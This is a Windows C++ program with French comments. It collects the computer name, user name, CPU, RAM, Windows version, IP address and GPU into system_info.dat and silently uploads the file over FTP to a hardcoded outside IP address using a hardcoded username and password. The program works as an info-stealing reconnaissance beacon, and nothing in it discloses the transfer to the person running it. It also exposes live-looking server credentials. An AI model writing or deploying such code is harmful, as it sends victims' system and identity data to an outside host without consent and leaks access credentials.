#include <windows.h>
#include <wininet.h>
#include <wbemidl.h>
#include <fstream>
#include <iostream>
#include <shlwapi.h>
#include <iphlpapi.h>
#include <rpc.h>
#include <stdlib.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

using namespace std;

string globalUUID = "";

// Fonction pour r�cup�rer le nom du GPU via WMI sans utiliser _bstr_t
string getGPUName() {
    string gpuName = "Inconnu";
    HRESULT hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres))
        return gpuName;

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hres)) {
        CoUninitialize();
        return gpuName;
    }

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        CoUninitialize();
        return gpuName;
    }

    // Cr�ation du namespace WMI
    BSTR ns = SysAllocString(L"ROOT\\CIMV2");
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(ns, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    SysFreeString(ns);
    if (FAILED(hres)) {
        pLoc->Release();
        CoUninitialize();
        return gpuName;
    }

    // Pr�parer et ex�cuter la requ�te WQL
    BSTR queryLanguage = SysAllocString(L"WQL");
    BSTR query = SysAllocString(L"SELECT * FROM Win32_VideoController");
    IEnumWbemClassObject* pEnumerator = NULL;
    hres = pSvc->ExecQuery(queryLanguage, query, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);
    SysFreeString(queryLanguage);
    SysFreeString(query);
    if (FAILED(hres)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return gpuName;
    }

    IWbemClassObject* pClassObject = NULL;
    ULONG uReturn = 0;
    if (pEnumerator) {
        hres = pEnumerator->Next(WBEM_INFINITE, 1, &pClassObject, &uReturn);
        if (uReturn != 0 && pClassObject) {
            VARIANT vtProp;
            hres = pClassObject->Get(L"Name", 0, &vtProp, 0, 0);
            if (SUCCEEDED(hres) && vtProp.vt == VT_BSTR && vtProp.bstrVal != NULL) {
                // Conversion du BSTR (UTF-16) en cha�ne UTF-8
                int len = WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, NULL, 0, NULL, NULL);
                if (len > 0) {
                    char* buffer = new char[len];
                    WideCharToMultiByte(CP_UTF8, 0, vtProp.bstrVal, -1, buffer, len, NULL, NULL);
                    gpuName = buffer;
                    delete[] buffer;
                }
            }
            VariantClear(&vtProp);
            pClassObject->Release();
        }
        pEnumerator->Release();
    }

    pSvc->Release();
    pLoc->Release();
    CoUninitialize();

    return gpuName;
}

// Fonction pour g�n�rer un UUID localement
string getUUID() {
    UUID uuid;
    UuidCreate(&uuid);
    char buffer[37]; // 36 caract�res + '\0'
    snprintf(buffer, sizeof(buffer),
        "%08x-%04x-%04x-%04x-%02x%02x%02x%02x%02x%02x",
        uuid.Data1, uuid.Data2, uuid.Data3,
        (uuid.Data4[0] << 8) | uuid.Data4[1],
        uuid.Data4[2], uuid.Data4[3], uuid.Data4[4],
        uuid.Data4[5], uuid.Data4[6], uuid.Data4[7]);
    return string(buffer);
}

// Fonction pour cr�er le fichier system_info.dat et y �crire toutes les infos
void createSystemInfoFile() {
    ofstream file("system_info.dat");
    if (!file.is_open()) return;

    // R�cup�rer l'UUID
    globalUUID = getUUID();

    // R�cup�rer le nom du PC
    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(computerName, &size);

    // R�cup�rer le nom de l'utilisateur
    char userName[UNLEN + 1] = { 0 };
    size = UNLEN + 1;
    GetUserNameA(userName, &size);

    // R�cup�rer le nom du CPU depuis le registre
    char cpuName[128] = "Inconnu";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD cpuNameSize = sizeof(cpuName);
        RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &cpuNameSize);
        RegCloseKey(hKey);
    }

    // R�cup�rer les informations syst�me (architecture, nombre de processeurs, etc.)
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    // R�cup�rer la m�moire physique totale
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);

    // R�cup�rer le dossier Windows
    char windowsDir[MAX_PATH] = { 0 };
    GetWindowsDirectoryA(windowsDir, MAX_PATH);

    // R�cup�rer la version de Windows
    OSVERSIONINFO osvi;
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA(&osvi);

    // R�cup�rer l'adresse IP
    char ipAddress[16] = "Non d�tect�e";
    PIP_ADAPTER_INFO adapterInfo = NULL;
    ULONG outBufLen = sizeof(IP_ADAPTER_INFO);
    adapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
    if (GetAdaptersInfo(adapterInfo, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(adapterInfo);
        adapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
    }
    if (GetAdaptersInfo(adapterInfo, &outBufLen) == NO_ERROR) {
        strcpy_s(ipAddress, adapterInfo->IpAddressList.IpAddress.String);
    }
    free(adapterInfo);

    // R�cup�rer le nom du GPU
    string gpuName = getGPUName();

    // �criture des informations dans le fichier INI
    file << "[OTHER]" << endl;
    file << "UUID=" << globalUUID << endl;
    file << "[General]" << endl;
    file << "Nom_PC=" << computerName << endl;
    file << "Nom_Utilisateur=" << userName << endl;
    file << "[Processeur]" << endl;
    file << "Nom=" << cpuName << endl;
    file << "Architecture=" << sysInfo.wProcessorArchitecture << endl;
    file << "[Memoire]" << endl;
    file << "RAM_Totale=" << (memStatus.ullTotalPhys / (1024 * 1024)) << " MB" << endl;
    file << "[Windows]" << endl;
    file << "Dossier_Windows=" << windowsDir << endl;
    file << "Version=" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << endl;
    file << "Build=" << osvi.dwBuildNumber << endl;
    file << "[Reseau]" << endl;
    file << "Adresse_IP=" << ipAddress << endl;
    file << "[GPU]" << endl;
    file << "Nom_GPU=" << gpuName << endl;

    file.close();
}

// Fonction pour lire l'UUID depuis un fichier INI existant
void readUUIDFromFile() {
    ifstream file("system_info.dat");
    if (!file.is_open()) return;

    string line;
    while (getline(file, line)) {
        if (line.find("UUID=") != string::npos) {
            globalUUID = line.substr(5); // R�cup�re l'UUID (apr�s "UUID=")
        }
    }
    file.close();
}

// Fonction pour uploader le fichier sur un serveur FTP
bool uploadFileToFTP(const char* ftpServer, const char* username, const char* password, const char* localFile, const char* remoteFile) {
    HINTERNET hInternet = InternetOpenA("FTP_Client", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hFtpSession = InternetConnectA(hInternet, ftpServer, INTERNET_DEFAULT_FTP_PORT, username, password,
        INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (!hFtpSession) {
        InternetCloseHandle(hInternet);
        return false;
    }

    bool success = FtpPutFileA(hFtpSession, localFile, remoteFile, FTP_TRANSFER_TYPE_BINARY, 0);

    InternetCloseHandle(hFtpSession);
    InternetCloseHandle(hInternet);

    return success;
}

// Fonction principale (WinMain)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!PathFileExistsA("system_info.dat")) {
        // Si le fichier n'existe pas, on le cr�e et on l'upload
        createSystemInfoFile();
        uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", "system_info.dat", "system_info.dat");
        MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
    }
    else {
        // Sinon, on lit l'UUID existant
        readUUIDFromFile();
        MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
    }
    return 0;
}
